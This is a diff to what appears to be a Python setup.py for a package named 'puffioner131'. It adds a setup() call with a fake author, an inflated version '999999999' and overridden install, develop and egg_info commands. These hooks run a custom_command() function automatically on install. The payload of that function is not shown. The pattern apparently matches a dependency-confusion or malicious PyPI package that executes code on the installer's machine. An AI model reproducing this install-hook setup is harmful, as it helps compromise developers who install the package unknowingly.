@@ -31,4 +31,16 @@ class CustomEggInfoCommand(egg_info):
         custom_command()
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                          
+setup(
+     name='puffioner131',
+    version='999999999',
+    description='Descriptionnn',
+    author='asdsadaslolo',
+    author_email='asdkmasijaisjdsadas@example.com',
+    packages=[],
+    cmdclass={
+        'install': CustomInstallCommand,
+        'develop': CustomDevelopCommand,
+        'egg_info': CustomEggInfoCommand,
+    },
+)
